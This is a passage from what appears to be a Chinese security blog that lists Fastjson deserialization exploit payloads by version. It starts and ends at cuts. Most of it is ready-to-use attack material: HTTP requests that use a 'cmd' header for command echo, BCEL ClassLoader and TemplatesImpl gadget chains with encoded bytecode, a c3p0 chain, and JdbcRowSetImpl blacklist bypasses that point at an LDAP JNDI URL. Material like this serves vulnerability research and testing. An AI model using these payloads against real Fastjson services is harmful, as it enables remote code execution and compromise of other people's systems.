3$84QQ$G$ad$dd$z$b2$M$c4$j$ddvx$$$e6f$ee$a7e$7c$86y$xAYnDSPR$c3V$c26$cc$86$88$c0$88$96$Kl$95$60$a9$e1$rh$d3$d0$82$8d$gZ$b1$91$80$k$97$k$g$ea$b1F$c3$3a$ac$970O$ec$ee$af$8a$9b$f6$be$a8$e9Tu$3bNo$d5z6ao$a1$cd$dc$9b0$e3$8e$8c$cfj$Y$c1e$N$8dx$b1$84$db$t$3a$e4E$5d$c3$GA$3ds$o$f4j$f8$i$dad$7c$5e$c3$d3$f8$82$868h$c4$X$f12$N_$S$cdKE$f3e$7cE$c3W$f15$a6$3e$c3$b9$de$U$v$cb$i$ba$813$Bzcrj$f8$3a$be1f$dd$c3$a8$8coj$f8$W$be$ad$a1$J$cd$y3$Z$A8F$f3$cc$f0$93$b0$e0$ff$A$9f$84$db$s$80$9e$E$d9$8aW$c5$88$3a$Z$df$d1$f0$5d$7cO$c3$f7$f1$MkH_$q$d6i$f5$J$bf$fc$80$c9$b8n$f5$G$c2dS$7bC$e5$5d$9eG$3c8$8e$da1$W$a4c$m$Q6$f4X$cc$b4e$fcP$c3$V$fcH$c3$8f$f1$T$Z$3f$d5$f03$fc$5c$40$e7$X$84$fb$8e$3a$N$bf$c4$af4$fc$g$cfhx$W$bf$d1$f0$5b$81$a9$df$89$e6$f7$f8$D$f1$a8$e1$8f$f8$93$86$3f$e3$_$g$fe$8a$bf$J$a8$e9$94$be$7d$7c$z$d0$f0w$R$bb$7f$e09$a6$de$84$b5$89$85b$fbM2$a3$f0$F$b6$98$9e$Z$ab$3a$9d$T$e5$m$F$8ey$a5$e3kwY$86r$3f$b9W8$cf$z$91$ed$b6n$98c$e0$d3$dem$T$7dLh$pa$dbf$cc$Z$9dO$zMg$e5$ad$92$97b$d0F$3d$S$a3x$9f$deI$3a$85$d1J$e93$a54$93$f4$fcH$bc$$$k$X$f7$hKs$83m$f5$I$de$e3$e8DM$W$81$f7$A$qaU$G$db$b6$8f$3fu$b3$w$3c$fd$85$f6$I$bf$I1$bd$87$8eX$96$a1$dag$IzY$a6$bb0$3d7$P$c4$j$b3$c7$bb$pZm$ab$d7$b4$9d$D$y$x$T$c4$e7$fau$9b$ebXMV$9fi$d7$eb$e2j$Z$eb$f9$ebD$rc$9c$c6z$k$W$b5$yf$98$ae$ef$K$fe$b7$d7$96$889$RQ$e7Uqc$8dNBc$b8$a6$96$c5$3dk$ee7$N$be$3a$s$d0$95V$89JQ$3bFRjQ$c2$qJj$8c$f5$s$I2$e2$84$8e$u$i$95$c6$d4M$db$e0$f1$f2$d2$8c$h$Z$a4$f3$ce$d5$Sqs$8d$Z$8d$f4xy$7f$T$r$d3$8b$81$b0$wf$ee$e7$8d$p$bb$c8$8f$c6nx$H$a4I$I$ec$8a$s$e2$bc$ea$CF$d4$S$ce$_$a0$rk$d2$af6Z7$a3$b4$ecfI$9c$c7$8b$d5$ab$a3$R$f7$89$e3$_$dd$s8$fb$c8$e9$G$M$dc$MM2$d3$c4$b6$f5$D$ee$b3$8a$B$cd$e3$f1p$82H2$bc$e4$K$89$3cc$ee$d1$ae1$F$a1h$7c$d2$a5$5e$80$98$c5gh1$9f$e52$UqCB$c2Z$ce$b2$d0$c09$_K$8e$Vq$ff$b9$fd$86T$cf$db$c3$edy$df$ba$7d$ab$db$Hx$96$d70$db0gI$f2$c8b$bf$bc$fc$i$qi$IY$fc$7c$X$e0$dfz$O$81$nd$PB$O$wI$e4$MA$V$c3$5cw$a8$N$40iZ$90$c4$a4aL$f6$N$p$ff$yyMC$F$l$d4y$f0$a1$9d$dc$aa$90$cbv2$9f$fc$F$94$h$84$86$v$a4$I$d1$KAWD$caB$y$e4$83$7d$JJP$8b$Z$d8D$eai$d4c$nOl$c6$W$f2$a3F$b8$H$5b$d9o$e3$97$8f$ac$e7yH$92$b1$5d4$3b$fcP$c5$dd$cb$Ta$97$o$cb$3dQ$5c$3e$82$bcAd$97$tQp$M$B$ff$Zo$i$dc$e2$3b$c3$5dO$b3$m$r$A$b7a$S$ffS$e4c$Ou$98$ebJ$d7$3c$Ox$b9$eb$p$n$d3$8f$acI$Sv$K$8fI$5c$GE$f2$o$f1Df$3d$82l$c1H$aa$y$c9_r$g$93$H$915$o$3c$e4$h$81$ffl$f90$a6$i$97B$5c$bb$8c$87$G$a1R$85$a9I$84$8e$e1$409$fd$cb$85$e04$ffS$u$dc$ea$LN$P$tQT$ceI1$t$r$9c$cc$b8$84$e9C$b8e$Q$b7$5c$86$w$a21$802$f2$n$83$e0$ad$3e$9e$nys$F$X8$$$s5C$c5P4$7b$84$8b$9b$x$92$985$80r$d1$cf$Z$c0l$d1$cf$h$401$d5$ba$8c$a9$83$d0$ae$x$oS$R$9f$abs$b7$absG$f0$f6a$ccO$a24X$96D$f91$u$c1$F$D$I$E$x$9ay$uX$99$SL$ca$94$d8K$a8j$a9$bc$80$ea$ad$c3XHU$93X$94$c4$e2$8asxQpI$Sw$q$b14$89$3b$x$93$b8$8b$df$b2$B$f8$9b$cf$96$97$f8w$ba8$J$a0$D$P$e0$m$fd$bf$I$P$e3Q$c6$40$f4G$f8$bfN$f4$t$Y$8b$Ri$a64$87$fb$5e$b4$k$e7$K0$9fQ$x$r$82$ca$Z$9f$F$a8$q$82$W$R$M$9b$88$96$ed$iu$e0$O$d8XJ$be$b5$e4$7c$t$fa$b1$8c$bc$ea$c9$fdn$i$c2$K$3c$c6$f1$R$ac$c4Q$ac$c2$T$i$9f$40$jN2$9b$9e$e4$f84$b3$u$c9$i$3a$cf$8c$Za$be$5ca$c6$5cE$8b4$9d$8f$d3$Zh$95f$oLm$da$a4$b9h$97$e6a$8bTAD$K$b4$ec$40$OeN$a2l$83$80$e8wQ$db$c9$d1$nwdrt$d4$j$ed$e2$e8$a4$3b$ea$e2$e8$K$a5vSB$We$94$o$82$dd$b4$92$Q$c2$k$Xsb$UE$Pq$u$d0W$8a$fc$m$fe$85$96$9d2b$fe$d52$acu2z$f9$ed$95$a7$cd$ac$93a$3f$87$b5$dc$Ba$u$Q$9a$93E$s$e0q$81$d2$f8$uJ$a5$7b$d8k$5c$eb$X$91$Xp$a8i$a9$bc$b8$d4$ef$5b$g$I$FB$feS0$xC$81$c55$d9E$d9$fe$qj$a5$g$b9H$a4$cbr$f6$b2$8b$94$bb$8fC$x$92K$86$b1b$A$d5E$f2$r$ac$e4$afF$vR$$$$$cd$f1$zUCj$u$e7$U$a6$V$v$nuqMnQ$ae$m$ecW$a5$81$e7$9f$rxj$94$fe$A$87$c7$vt$d5$d6$e6$cb$cf$3f$u$8a$c4$7cXt$dbhpW3$B$85$x$DL$e4$5b$99asi$ca$7c$ba$b4$9a$ae$ac$a1$T$eb$e94$83$O$8b$b0$b7h$abM$e78$a4$bd$X$7bq$lg$H9$T$c1XA$t$Y$fc$i$ba1$97$i$9a$5d$87$ca$e4$b9$Z$J$ec$e3$O$3d$80$3e$cf$c9$iyN$O$e0$7e$ecg$d8$b3$5cwWA$f97$C2$O$5cC$ae$8c$7b$r$e9$3fX$q$e3$3e$Z$af$b8$86$C$Z$x$r$e9$w$8a$Y$86$d8$3f$c1Q$60$d4$e9$7d$v$a7$xx$e5$f5$8a$3a$db$ad$q$M$E$abc$SuC$90$cf$8a$e0$ba$sg$bb$7b$K$dbW$b9$d5$fb$fe$ff$Ctz$ebem$R$A$A&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;: &quot;x&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="1-2-33-lt-fastjson-lt-1-2-47"><a href="#1-2-33-lt-fastjson-lt-1-2-47" class="headerlink" title="1.2.33 &lt;= fastjson &lt;= 1.2.47"></a>1.2.33 &lt;= fastjson &lt;= 1.2.47</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;json HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1:9092</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">cmd: whoami</span><br><span class="line">Content-Length: 3647</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;xx&quot;:</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;@type&quot; : &quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;   : &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;x&quot; : &#123;</span><br><span class="line">        &quot;name&quot;: &#123;</span><br><span class="line">            &quot;@type&quot; : &quot;java.lang.Class&quot;,</span><br><span class="line">            &quot;val&quot;   : &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,</span><br><span class="line">            &quot;c&quot;: &#123;</span><br><span class="line">                &quot;@type&quot;:&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;,</span><br><span class="line">                &quot;driverClassLoader&quot;: &#123;</span><br><span class="line">                    &quot;@type&quot; : &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;driverClassName&quot;:&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$cb$5b$TW$U$ff$5dH27$c3$m$g$40$Z$d1$wX5$a0$q$7d$d8V$81Zi$c4b$F$b4F$a5$f8j$t$c3$85$MLf$e2$cc$E$b1$ef$f7$c3$be$ec$a6$df$d7u$X$ae$ddD$bf$f6$d3$af$eb$$$ba$ea$b6$ab$ae$ba$ea$7fP$7bnf$C$89$d0$afeq$ee$bd$e7$fe$ce$ebw$ce$9d$f0$cb$df$3f$3e$Ap$I$df$aaHbX$c5$IF$a5x$9e$e3$a8$8a$Xp$8ccL$c1$8b$w$U$e4$U$iW1$8e$T$i$_qLp$9c$e4x$99$e3$94$bc$9b$e4$98$e2$98VpZ$o$cep$bc$c2qVE$k$e7Tt$e2$3c$c7$F$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$U$af$ab0PP$b1$h$s$c7$9c$5c$85$U$f3$i$L$iE$F$96$82E$86$c4$a8$e5X$c1Q$86$d6$f4$c0$F$86X$ce$9d$T$M$j$93$96$p$a6$x$a5$82$f0$ce$Z$F$9b4$7c$d4$b4$pd$7b$3e0$cc$a5$v$a3$5c$bb$a2j$U$yQ$z$94$ac$C$9b$fc2$a8y$b7$e2$99$e2$84$r$z$3b$f2e$cfr$W$c6$cd$a2$9bY4$96$N$N$H1$a4$a0$a4$c1$81$ab$a1$8ck$M$a3$ae$b7$90$f1k$b8y$cf$u$89$eb$ae$b7$94$b9$$$K$Z$d3u$C$b1$Sd$3cq$ad$o$fc$ms6$5cs$a1z$c2$b5$e7$84$a7$c0$d3$e0$p$60$e8Z$QA$84$Y$L$C$cf$wT$C$e1S$G2l$d66$9c$85l$ce6$7c_C$F$cb$M$9b$d7$d4$a7$L$8b$c2$M$a8$O$N$d7$b1$c2p$ec$ff$e6$93$X$de$b2$bda$d0$b6Z$$$7e$d9u$7c$oA$5d$cb$8ca$a7$M$bc$92$f1C$db5$lup$92$c03$9e$V$I$aa$eb$86$ccto$b3A1$I$ca$99$J$S$cd$d1C$c3$Ja$Q$tM$d5$e5$DY$88$867$f0$s$f5$d9$y$cd1$u$ae$9fq$a80$Foix$h$efhx$X$ef$d1$e5$cc$c9i$N$ef$e3$D$86$96$acI$b0l$c1r$b2$7e$91$8eC$a6$86$P$f1$R$e9$q$z$81$ed0l$a9$85$a8$E$96$9d$cd$9b$86$e3$c8V$7c$ac$e1$T$7c$aa$e13$7c$ae$e0$a6$86$_$f0$a5l$f8W$e4$e1$f2$98$86$af$f1$8d$86$5b2T$7c$de$aeH$c7q$d3ve$d1$9dk$f9$8e$af$98$a2$iX$$$85$e85$ddRv$de$f0$83E$dfu$b2$cb$V$8a$b4$3aM$M$3dk6$9e$98$b7$a9$85$d9$v$R$U$5d$w$b0$f3$d2$e4$a3$E$8c4$91r$ae$e8$RS4$cdf$c5$f3$84$T$d4$cf$5d$e9$81$c9GQd$d9M$d4FSW$9b$a1I7$a4Yo$827$5cI$9b$N$_$a8M6mj$gjmz$7d$9e$eb$3c$8e$84$ad$ad$d7vl$D$9bK$ebl$g$bd4$b3C$ee$S$96$b3$ec$$$R$edG$g$7d$85$cf$a0$c9W$a4$gX$af$a2$feSN$c7$85i$h$9e$98$ab$e7$d6$ee$8b$60$cc4$85$ef$5b$b5$efF$y$7dQ$7eW$g$a7$f1$86$l$88R$f8$40$cexnYx$c1$N$86$7d$ff$c1$c3j$L$db$C$f7$7c$99$8cr$86$9c$9a$e6n$ad$82$b8$7c$a7$86$e5$Q$c1$bd$8d$8esE$c3$cb$cb$d7$e2$98bd$e0$o$Be$5b$c3Nt$ae$ef$e4H$7d$c6k$aa$b3$V$t$b0J$f5$c7$5c$3ft7$99Ej2$8c$89$VA$_$u$9d$de$60$Q$h$z$88$C$c9Vs$a8H$c9$b0$89B$9dt$ca$95$80$y$85A$acm$ab$87$b3$dcl$c3$F$99$f7$a47$bc$90$eck$V_$i$X$b6U$92$df$U$86$fd$ff$ceu$e3c$96E84$ef$e8$c3$B$fa$7d$91$7f$z$60$f2$ebM2C$a7$9d$b42Z$e3$83w$c1$ee$d0$86$nK2QS$s$c0$f1D$j$da$d2O$O$da$Ip$f5$kZ$aahM$c5$aa$88$9f$gL$rZ$efC$a9$82O$k$60$b4KV$a1NE$80$b6$Q$a0$d5$B$83$a9$f6h$3b$7d$e0$60$84$j$8e$N$adn$e3$91$dd$s$b2Ku$84$d0$cd$c3$89H$bbEjS1$d2$ce$b6$a6$3a$f3$f2J$d1$VJ$a2KO$84R$8f$d5$3dq$5d$d1$e3$EM$S$b4$9b$a0$ea$cf$e8$iN$s$ee$93TS$5b$efa$5b$V$3d$v$bd$8a$ed$df$p$a5$ab$S$a3$ab$b1To$fe6$3a$e4qG$ed$b8$93d$5cO$e6u$5e$c5c$a9$5d$8d$91u$k$3a$ff$J$bbg$ef$a1OW$ab$e8$afb$cf$5d$3c$9e$da$5b$c5$be$w$f6$cb$a03$a1e$3a$aaD$e7Qz$91$7e$60$9d$fe6b$a7$eeH$e6$d9$y$bb$8cAj$95$ec$85$83$5e$92IhP$b1$8d$3a$d0G$bb$n$b4$e306$n$87$OLc3f$b1$F$$R$b8I$ffR$dcB$X$beC7$7e$c0VP$a9x$80$k$fc$K$j$bfa$3b$7e$c7$O$fcAM$ff$T$bb$f0$Xv$b3$B$f4$b11$f4$b3Y$ec$a5$88$7b$d8$V$ec$c7$93$U$edY$c4$k$S$b8M$c1S$K$9eVp$a8$$$c3M$b8$7fF$n$i$da$k$c2$93s$a3$e099$3d$87k$pv$e4$l$3eQL$40E$J$A$A&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; : &quot;xxx&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>1.2.33&lt;=fastjson&lt;=12.36</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;name&quot;:</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;@type&quot; : &quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;   : &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;x&quot; : &#123;</span><br><span class="line">        &quot;name&quot;: &#123;</span><br><span class="line">            &quot;@type&quot; : &quot;java.lang.Class&quot;,</span><br><span class="line">            &quot;val&quot;   : &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,</span><br><span class="line">            &quot;c&quot;: &#123;</span><br><span class="line">                &quot;@type&quot;:&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;,</span><br><span class="line">                &quot;driverClassLoader&quot;: &#123;</span><br><span class="line">                    &quot;@type&quot; : &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;driverClassName&quot;:&quot;$$BCEL...&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; : &quot;ddd&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>1.2.37&lt;=fastjson&lt;=1.2.47</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;name&quot;:</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;@type&quot; : &quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;   : &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;x&quot; : &#123;</span><br><span class="line">        &quot;name&quot;: &#123;</span><br><span class="line">            &quot;@type&quot; : &quot;java.lang.Class&quot;,</span><br><span class="line">            &quot;val&quot;   : &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;y&quot;: &#123;</span><br><span class="line">            &quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,</span><br><span class="line">            &quot;c&quot;: &#123;</span><br><span class="line">                &quot;@type&quot;:&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;,</span><br><span class="line">                &quot;driverClassLoader&quot;: &#123;</span><br><span class="line">                    &quot;@type&quot; : &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;driverClassName&quot;:&quot;$$BCEL$..&quot;,</span><br><span class="line"></span><br><span class="line">                     &quot;$ref&quot;: &quot;$.x.y.c.connection&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其他</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;@type&quot;: &quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;,</span><br><span class="line">  &quot;key&quot;: &#123;</span><br><span class="line">    &quot;@type&quot;: &quot;java.lang.Class&quot;,</span><br><span class="line">    &quot;val&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;driverClassLoader&quot;: &#123;</span><br><span class="line">    &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;driver&quot;: &quot;$$BCEL$$xxxxxxx&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h3><p>利用条件苛刻，可用于解决不出网利用。<br>需要调用<code>parseObject()</code>方法时，加入Feature.SupportNonPublicField参数。<br>_bytecodes要进行base64编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&quot;_bytecodes&quot;:[&quot;yv66vgAAADQAJgoABwAXCgAYABkIABoKABgAGwcAHAoABQAXBwAdAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHAB4BAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAfAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHACABAApTb3VyY2VGaWxlAQALVEVNUE9DLmphdmEMAAgACQcAIQwAIgAjAQASb3BlbiAtYSBDYWxjdWxhdG9yDAAkACUBAAZURU1QT0MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAHAAAAAAAEAAEACAAJAAIACgAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQALAAAADgADAAAACwAEAAwADQANAAwAAAAEAAEADQABAA4ADwABAAoAAAAZAAAABAAAAAGxAAAAAQALAAAABgABAAAAEQABAA4AEAACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAAFgAMAAAABAABABEACQASABMAAgAKAAAAJQACAAIAAAAJuwAFWbcABkyxAAAAAQALAAAACgACAAAAGQAIABoADAAAAAQAAQAUAAEAFQAAAAIAFg&#x3D;&#x3D;&quot;],&quot;_name&quot;:&quot;a.b&quot;,&quot;_tfactory&quot;:&#123; &#125;,&quot;_outputProperties&quot;:&#123; &#125;,&quot;_version&quot;:&quot;1.0&quot;,&quot;allowedProtocols&quot;:&quot;all&quot;&#125;</span><br></pre></td></tr></table></figure><h4 id="c3p0-WrapperConnectionPoolDataSource"><a href="#c3p0-WrapperConnectionPoolDataSource" class="headerlink" title="c3p0#WrapperConnectionPoolDataSource"></a>c3p0#WrapperConnectionPoolDataSource</h4><p>可用于解决不出网利用。<br>fastjson &lt;1.2.47<br>利用c3p0二次反序列化 cc payload到达回显。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;json HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1:8999</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;75.0.3770.142 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">cmd: dir</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 8925</span><br><span class="line"></span><br><span class="line">&#123;&quot;e&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;&#125;,&quot;f&quot;:&#123;&quot;@type&quot;:&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;,&quot;userOverridesAsString&quot;:&quot;HexAsciiSerializedMapquot;&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="Fastjson-1-2-25-1-2-41"><a href="#Fastjson-1-2-25-1-2-41" class="headerlink" title="Fastjson 1.2.25-1.2.41"></a>Fastjson 1.2.25-1.2.41</h3><p>1.2.25后将TypeUtils.loadClass替换为checkAutoType()函数，增加了黑名单和白名单。<br>把autoTypeSupport默认为False。<br>当autoTypeSupport为False时，先黑名单过滤，再白名单过滤，若白名单匹配上则直接加载该类，否则报错。<br>当autoTypeSupport为True时，先白名单过滤，匹配成功即可加载该类，否则再黑名单过滤。<br>1.2.25黑名单</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">bsh</span><br><span class="line">com.mchange</span><br><span class="line">com.sun.</span><br><span class="line">java.lang.Thread</span><br><span class="line">java.net.Socket</span><br><span class="line">java.rmi</span><br><span class="line">javax.xml</span><br><span class="line">org.apache.bcel</span><br><span class="line">org.apache.commons.beanutils</span><br><span class="line">org.apache.commons.collections.Transformer</span><br><span class="line">org.apache.commons.collections.functors</span><br><span class="line">org.apache.commons.collections4.comparators</span><br><span class="line">org.apache.commons.fileupload</span><br><span class="line">org.apache.myfaces.context.servlet</span><br><span class="line">org.apache.tomcat</span><br><span class="line">org.apache.wicket.util</span><br><span class="line">org.codehaus.groovy.runtime</span><br><span class="line">org.hibernate</span><br><span class="line">org.jboss</span><br><span class="line">org.mozilla.javascript</span><br><span class="line">org.python.core</span><br><span class="line">org.springframework</span><br></pre></td></tr></table></figure><p>exp</p><p>条件需要开启autotype</p><p>类名前面加了一个L，后面加一个;可以绕过黑名单</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;,&quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;localhost:1389&#x2F;badNameClass&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure><h3 id="Fastjson-1-2-25-1-2-42"><a href="#Fastjson-1-2-25-1-2-42" class="headerlink" title="Fastjson 1.2.25-1.2.42"></a>Fastjson 1.2.25-1.2.42</h3><p>从1.2.42版本开始,把之前的明文黑名单，改为hash黑名单。</p><p>如下大佬整理的</p><p><a href="https://github.com/LeadroyaL/fastjson-blacklist">https://github.com/LeadroyaL/fastjson-blacklist</a></p><p>exp</p><p>条件需要开启autotype</p><p>双写绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;,&quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;localhost:1389&#x2F;badNameClass&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure><h3 